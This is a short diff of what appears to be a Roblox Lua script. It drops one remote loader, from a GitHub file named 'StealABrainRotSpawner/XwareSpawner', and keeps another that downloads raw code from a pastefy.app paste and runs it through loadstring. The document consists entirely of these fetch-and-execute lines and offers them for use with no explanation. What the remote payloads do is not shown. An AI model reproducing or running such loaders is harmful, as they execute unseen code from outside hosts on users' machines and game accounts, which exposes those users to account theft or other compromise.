@@ -1,2 +1,1 @@
-loadstring(game:HttpGet('https://pastefy.app/tJcWsMDd/raw'))();
-RUN_AFTER=loadstring(game:HttpGet("https://raw.githubusercontent.com/Crypoth/StealABrainRotSpawner/refs/heads/main/XwareSpawner"))()
+loadstring(game:HttpGet('https://pastefy.app/tJcWsMDd/raw'))()
